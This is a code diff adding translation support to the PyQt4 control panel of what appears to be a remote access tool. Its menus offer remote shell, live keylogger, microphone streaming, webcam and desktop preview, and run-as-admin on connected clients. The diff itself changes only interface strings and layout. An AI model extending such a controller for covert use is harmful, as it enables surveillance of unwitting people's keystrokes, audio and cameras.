@@ -11,18 +11,17 @@ import hashlib
 import string
 import random
 import datetime
-import ConfigParser
 from threading import Thread
 
 from PyQt4.QtGui import *
 from PyQt4.QtCore import *
 
 from libs import pygeoip
+from libs import languages
 from ui import gui
 from libs.alias import Alias
 from libs.settings import Config, Settings
 from libs.modechat import get, send
-from libs.language import ChooseLanguage
 from plugins.maudio import main as maudio
 from plugins.mexplorer import main as mexplorer
 from plugins.mshell import main as mshell
@@ -39,7 +38,7 @@ geo_ip_database = pygeoip.GeoIP('assets\\GeoIP.dat')
 # initial assets directories
 assets = os.path.join(os.getcwd(), 'assets\\')
 flags = os.path.join(assets, 'flags')
-languages = os.path.join(os.getcwd(), 'libs', 'languages')
+langs = os.path.join(os.getcwd(), 'libs', 'languages')
 
 
 def get_ip_location(ip):
@@ -48,6 +47,13 @@ def get_ip_location(ip):
         return country_flag
     else:
         return os.path.join(flags, 'blank.png')
+
+
+def _(_dict, word):
+    if _dict.has_key(word):
+        return _dict[word]
+    else:
+        return word
 
 
 def id_generator(size=16, chars=string.ascii_uppercase + string.digits):
@@ -69,6 +75,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.setupUi(self)
 
         self.settings = Config()
+        self.LANGUAGE = 'english'
 
         # set settings
         self.update_settings()
@@ -121,12 +128,13 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.index_of_activeWindowTitle = 9
         # initialize servers table columns width
         self.serversTable.setColumnWidth(self.index_of_ipAddress, 100)
+        self.serversTable.setColumnWidth(self.index_of_alias, 60)
         self.serversTable.setColumnWidth(self.index_of_socket, 50)
         self.serversTable.setColumnWidth(self.index_of_os, 90)
         self.serversTable.setColumnWidth(self.index_of_user, 90)
-        self.serversTable.setColumnWidth(self.index_of_privs, 60)
-        self.serversTable.setColumnWidth(self.index_of_lock, 85)
-        self.serversTable.setColumnWidth(self.index_of_microphone, 45)
+        self.serversTable.setColumnWidth(self.index_of_privs, 110)
+        self.serversTable.setColumnWidth(self.index_of_lock, 100)
+        self.serversTable.setColumnWidth(self.index_of_microphone, 70)
         self.serversTable.setColumnWidth(self.index_of_webcamera, 45)
         # servers table double click trigger
         self.serversTable.doubleClicked.connect(self.unlock_client)
@@ -172,6 +180,58 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.connect(self, SIGNAL('executeScripting()'), lambda: self.execute_plugin(plugin='scripting'))
         self.connect(self, SIGNAL('executeProcesses()'), lambda: self.execute_plugin(plugin='processes'))
 
+        self.set_language()
+
+    def set_language(self):
+        if self.LANGUAGE in languages.__all__:
+            lang = __import__('libs.languages.%s' % self.LANGUAGE, globals(), locals(), ['tr'], -1)
+            self.tr = lang.tr
+
+            # HEADERS
+            self.serversTable.horizontalHeaderItem(0).setText(_(self.tr, 'HEADER_IP_ADDRESS'))
+            self.serversTable.horizontalHeaderItem(1).setText(_(self.tr, 'HEADER_ALIAS'))
+            self.serversTable.horizontalHeaderItem(2).setText(_(self.tr, 'HEADER_SOCKET'))
+            self.serversTable.horizontalHeaderItem(3).setText(_(self.tr, 'HEADER_OS'))
+            self.serversTable.horizontalHeaderItem(4).setText(_(self.tr, 'HEADER_USER'))
+            self.serversTable.horizontalHeaderItem(5).setText(_(self.tr, 'HEADER_PRIVS'))
+            self.serversTable.horizontalHeaderItem(6).setText(_(self.tr, 'HEADER_LOCK'))
+            self.serversTable.horizontalHeaderItem(7).setText(_(self.tr, 'HEADER_MIC'))
+            self.serversTable.horizontalHeaderItem(8).setText(_(self.tr, 'HEADER_CAM'))
+            self.serversTable.horizontalHeaderItem(9).setText(_(self.tr, 'HEADER_ACTIVE_WINDOW_TITLE'))
+            # END HEADERS
+
+            # BOTTOM
+            self.clientStatusLabel.setText(_(self.tr, 'BOTTOM_STATUS'))
+            self.ipv4TextLabel.setText(_(self.tr, 'BOTTOM_IPV4'))
+            self.portTextLabel.setText(_(self.tr, 'BOTTOM_PORT'))
+            self.serversOnlineStatus.setText(_(self.tr, 'BOTTOM_SERVERS_TOTAL'))
+            # END BOTTOM
+
+            # MENU
+            self.serverMenu.setTitle(_(self.tr, 'MENU_SERVER'))
+            self.actionStartListen_for_connections.setText(_(self.tr, 'MENU_SERVER_START'))
+            self.actionStopListen_for_connections.setText(_(self.tr, 'MENU_SERVER_STOP'))
+            self.actionClient_Configuration.setText(_(self.tr, 'MENU_SERVER_CONFIGURATION'))
+            self.menuServer.setTitle(_(self.tr, 'MENU_CLIENT'))
+            self.actionUnlock_Client.setText(_(self.tr, 'MENU_CLIENT_UNLOCK'))
+            self.actionLock_Client.setText(_(self.tr, 'MENU_CLIENT_LOCK'))
+            self.actionStop_Client.setText(_(self.tr, 'MENU_CLIENT_STOP'))
+            self.actionSet_Alias.setText(_(self.tr, 'MENU_CLIENT_SET_ALIAS'))
+            self.actionRun_As_Admin.setText(_(self.tr, 'MENU_CLIENT_RUN_AS_ADMIN'))
+            # END MENU
+
+            # PLUGINS
+            self.menuAction.setTitle(_(self.tr, 'MENU_PLUGIN'))
+            self.actionRemote_Shell.setText(_(self.tr, 'MENU_PLUGIN_SHELL'))
+            self.actionRemote_Explorer.setText(_(self.tr, 'MENU_PLUGIN_EXPLORER'))
+            self.actionRemote_Microphone.setText(_(self.tr, 'MENU_PLUGIN_MICROPHONE'))
+            self.actionRemote_Process_Manager.setText(_(self.tr, 'MENU_PLUGIN_PROCESSES'))
+            self.actionRemote_Keylogger.setText(_(self.tr, 'MENU_PLUGIN_KEYLOGGER'))
+            self.actionRemote_Scripting.setText(_(self.tr, 'MENU_PLUGIN_SCRIPTING'))
+            self.actionDesktop_Preview.setText(_(self.tr, 'MENU_PLUGIN_DESKTOP'))
+            self.actionWebcam_Preview.setText(_(self.tr, 'MENU_PLUGIN_WEBCAM'))
+            # END PLUGINS
+
     # Start Listen for Servers
     def listen_start(self):
         # update settings
@@ -187,7 +247,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.listenthread = Thread(target=self.accept_connections)
             self.listenthread.setDaemon(True)
             self.listenthread.start()
-            self.statusLabel.setText('Online')
+            self.statusLabel.setText(_(self.tr, 'STATUS_ONLINE'))
             self.statusLabel.setStyleSheet('color: lime; border: none; font: 8pt "MS Shell Dlg 2";')
             self.actionStartListen_for_connections.setChecked(True)
             self.actionStopListen_for_connections.setChecked(False)
@@ -201,7 +261,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.serversTable.clearContents()
             self.actionStartListen_for_connections.setChecked(False)
             self.actionStopListen_for_connections.setChecked(True)
-            self.statusLabel.setText('Offline')
+            self.statusLabel.setText(_(self.tr, 'STATUS_OFFLINE'))
             self.statusLabel.setStyleSheet('color: #e74c3c; border: none; font: 8pt "MS Shell Dlg 2";')
             self.onlineStatus.setText('0')
             try:
@@ -287,6 +347,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                                 self.streaming_socks[i] = {}
                                 self.streaming_socks[i]['sock'] = self.sock
                                 self.streaming_socks[i]['protection'] = info['protection']
+                                self.streaming_socks[i]['privileges'] = info['privileges']
                                 self.streaming_socks[i]['activewindowtitle'] = info['activewindowtitle']
                                 self.emit(SIGNAL('updateTable()'))
 
@@ -378,9 +439,12 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.serversTable.setItem(index, self.index_of_user, item)
 
                 # add user privileges
-                privs_status = 'User' if not self.streaming_socks[obj]['privileges'] == '1' else 'Admin'
+                try:
+                    privs_status = _(self.tr, 'INFO_USER') if not self.streaming_socks[obj]['privileges'] == '1' else _(self.tr, 'INFO_ADMIN')
+                except KeyError:
+                    print self.streaming_socks[obj]
                 item = QTableWidgetItem()
-                if privs_status == 'Admin':
+                if privs_status == _(self.tr, 'INFO_ADMIN'):
                     item.setIcon(QIcon(os.path.join(assets, 'admin.png')))
                 else:
                     item.setIcon(QIcon(os.path.join(assets, 'user.png')))
@@ -388,9 +452,9 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.serversTable.setItem(index, self.index_of_privs, item)
 
                 # add server lock status
-                lock_status = 'LOCKED' if self.streaming_socks[obj]['protection'] == 'False' else 'UNLOCKED'
+                lock_status = _(self.tr, 'INFO_LOCKED') if self.streaming_socks[obj]['protection'] == 'False' else _(self.tr, 'INFO_UNLOCKED')
                 item = QTableWidgetItem(lock_status)
-                if lock_status == 'LOCKED':
+                if lock_status == _(self.tr, 'INFO_LOCKED'):
                     item.setTextColor(QColor('#e67e22'))
                     item.setIcon(QIcon(os.path.join(assets, 'lock.png')))
                 else:
@@ -402,20 +466,20 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 item = QTableWidgetItem()
                 if self.socks[obj]['inputdevice'] == 'NoDevice':
                     item.setIcon(QIcon(os.path.join(assets, 'mic_no.png')))
-                    item.setText('No')
+                    item.setText(_(self.tr, 'INFO_NO'))
                 else:
                     item.setIcon(QIcon(os.path.join(assets, 'mic_yes.png')))
-                    item.setText('Yes')
+                    item.setText(_(self.tr, 'INFO_YES'))
                 self.serversTable.setItem(index, self.index_of_microphone, item)
 
                 # add webcam device
                 item = QTableWidgetItem()
                 if self.socks[obj]['webcamdevice'] == 'NoDevice':
                     item.setIcon(QIcon(os.path.join(assets, 'web_camera_no.png')))
-                    item.setText('No')
+                    item.setText(_(self.tr, 'INFO_NO'))
                 else:
                     item.setIcon(QIcon(os.path.join(assets, 'web_camera.png')))
-                    item.setText('Yes')
+                    item.setText(_(self.tr, 'INFO_YES'))
                 self.serversTable.setItem(index, self.index_of_webcamera, item)
 
                 # add active windows title
@@ -431,10 +495,10 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
     def unlock_client(self):
         while 1:
-            if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == 'LOCKED':
+            if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == _(self.tr, 'INFO_LOCKED'):
                 server = self.current_client()
                 if server:
-                    text, ok = QInputDialog.getText(self, 'Unlock Server', 'Enter Password: ', QLineEdit.Password)
+                    text, ok = QInputDialog.getText(self, _(self.tr, 'UNLOCK_CLIENT'), _(self.tr, 'ENTER_PASSWORD'), QLineEdit.Password)
                     if ok:
                         _hash = hashlib.md5()
                         _hash.update(str(text))
@@ -454,7 +518,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
     def update_main_menu(self):
         try:
-            if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == 'LOCKED':
+            if self.serversTable.item(self.serversTable.currentRow(), self.index_of_lock).text() == _(self.tr, 'INFO_LOCKED'):
                 self.actionUnlock_Client.setDisabled(False)
                 self.actionSet_Alias.setDisabled(False)
                 self.actionRun_As_Admin.setDisabled(False)
@@ -501,15 +565,12 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             self.actionWebcam_Preview.setDisabled(True)
 
     def has_microphone(self):
-        try:
-            if str(self.serversTable.item(self.serversTable.currentRow(), self.index_of_microphone).text()) == 'Yes':
+        client = self.current_client()
+        if client:
+            if self.socks[client]['inputdevice'] != 'NoDevice':
                 return True
             else:
                 return False
-        except AttributeError:
-            warn = QMessageBox(QMessageBox.Warning, 'Error', 'No Server Selected', QMessageBox.Ok)
-            warn.exec_()
-            return False
 
     def has_camera(self):
         server = self.current_client()
@@ -521,46 +582,46 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
     def server_right_click_menu(self, point):
         server_index = self.serversTable.currentRow()
         server_menu = QMenu(self)
-        server_options_menu = QMenu('Server Options', self)
+        server_options_menu = QMenu(_(self.tr, 'RM_CLIENT_OPTIONS'), self)
         server_options_menu.setIcon(QIcon(os.path.join(assets, 'settings.png')))
 
         if self.serversTable.selectedItems():
 
-            server_menu.addAction(QIcon(os.path.join(assets, 'add_alias.png')), 'Set Alias', self.add_alias)
-            server_menu.addAction(QIcon(os.path.join(assets, 'run_as_admin.png')), 'Run As Admin', self.run_as_admin)
+            server_menu.addAction(QIcon(os.path.join(assets, 'add_alias.png')), _(self.tr, 'RM_SET_ALIAS'), self.add_alias)
+            server_menu.addAction(QIcon(os.path.join(assets, 'run_as_admin.png')), _(self.tr, 'RM_RUN_AS_ADMIN'), self.run_as_admin)
             server_menu.addSeparator()
 
-            if self.serversTable.item(server_index, self.index_of_lock).text() == 'UNLOCKED':
-                server_menu.addAction(QIcon(os.path.join(assets, 'mshell.png')), 'Shell',
+            if self.serversTable.item(server_index, self.index_of_lock).text() == _(self.tr, 'INFO_UNLOCKED'):
+                server_menu.addAction(QIcon(os.path.join(assets, 'mshell.png')), _(self.tr, 'RM_SHELL'),
                                       lambda: self.run_plugin('shellMode'))
-                server_menu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), 'File Manager',
+                server_menu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), _(self.tr, 'RM_EXPLORER'),
                                       lambda: self.run_plugin('explorerMode'))
-                server_menu.addAction(QIcon(os.path.join(assets, 'mprocesses.png')), 'Processes',
+                server_menu.addAction(QIcon(os.path.join(assets, 'mprocesses.png')), _(self.tr, 'RM_PROCESSES'),
                                       lambda: self.run_plugin('processesMode'))
-                audio_menu = server_menu.addAction(QIcon(os.path.join(assets, 'maudio.png')), 'Audio Streaming',
+                audio_menu = server_menu.addAction(QIcon(os.path.join(assets, 'maudio.png')), _(self.tr, 'RM_MICROPHONE'),
                                                    lambda: self.run_plugin('audioMode'))
                 if not self.has_microphone():
                     audio_menu.setEnabled(False)
-                server_menu.addAction(QIcon(os.path.join(assets, 'script.png')), 'Remote Scripting',
+                server_menu.addAction(QIcon(os.path.join(assets, 'script.png')), _(self.tr, 'RM_SCRIPTING'),
                                       lambda: self.run_plugin('scriptingMode'))
-                server_menu.addAction(QIcon(os.path.join(assets, 'mkeylogger.png')), 'Live Keylogger',
+                server_menu.addAction(QIcon(os.path.join(assets, 'mkeylogger.png')), _(self.tr, 'RM_KEYLOGGER'),
                                       lambda: self.run_plugin('keyloggerMode'))
 
                 server_menu.addSeparator()
                 server_menu.addMenu(server_options_menu)
-                server_options_menu.addAction(QIcon(os.path.join(assets, 'lock.png')), 'Lock Server',
+                server_options_menu.addAction(QIcon(os.path.join(assets, 'lock.png')), _(self.tr, 'RM_LOCK'),
                                               self.lock_client)
-                server_options_menu.addAction(QIcon(os.path.join(assets, 'stop.png')), 'Terminate Server',
+                server_options_menu.addAction(QIcon(os.path.join(assets, 'stop.png')), _(self.tr, 'RM_TERMINATE'),
                                               self.terminate_client)
             else:
-                server_menu.addAction(QIcon(os.path.join(assets, 'unlock.png')), 'Unlock Client', self.unlock_client)
+                server_menu.addAction(QIcon(os.path.join(assets, 'unlock.png')), _(self.tr, 'RM_UNLOCK'), self.unlock_client)
 
             server_menu.addSeparator()
 
             server_menu.addAction(QIcon(os.path.join(assets, 'mdesktop.png')),
-                                  'Desktop Preview', self.get_desktop_preview)
+                                  _(self.tr, 'RM_DESKTOP'), self.get_desktop_preview)
             camera_menu = server_menu.addAction(QIcon(os.path.join(assets, 'webcam.png')),
-                                                'Camera Preview', self.get_webcam_preview)
+                                                _(self.tr, 'RM_CAMERA'), self.get_webcam_preview)
             if not self.has_camera():
                 camera_menu.setEnabled(False)
 
@@ -612,7 +673,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
     def add_alias(self):
         server = self.current_client()
         if server:
-            text, ok = QInputDialog.getText(self, 'Set Alias', 'Enter Name: ')
+            text, ok = QInputDialog.getText(self, _(self.tr, 'ALIAS_SET'), _(self.tr, 'ALIAS_NAME'))
             if ok:
                 self.alias.set_alias(self.socks[server]['ip_address'], self.socks[server]['os'], text)
 
@@ -624,7 +685,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
     def terminate_client(self):
         server = self.current_client()
         if server:
-            warn = QMessageBox(QMessageBox.Question, 'Confirm', 'Are you sure to terminate server?')
+            warn = QMessageBox(QMessageBox.Question, _(self.tr, 'TERMINATE_CONFIRM'), _(self.tr, 'TERMINATE_TEXT'))
             warn.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
             ans = warn.exec_()
             if ans == QMessageBox.Yes:
@@ -641,6 +702,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.PORT = self.settings.port
         self.MAXCONNECTIONS = self.settings.max_connections
         self.TIMEOUT = self.settings.timeout
+        self.LANGUAGE = self.settings.language
 
     def run_settings(self):
         self.settings_form = Settings()
@@ -678,8 +740,8 @@ DATE: %s/%s/%s %s:%s:%s
             log_file.write(log_value)
 
 
-open('error.log', 'w').close()
-sys.excepthook = handle_exception
+#open('error.log', 'w').close()
+#sys.excepthook = handle_exception
 
 # Run Application
 if __name__ == '__main__':
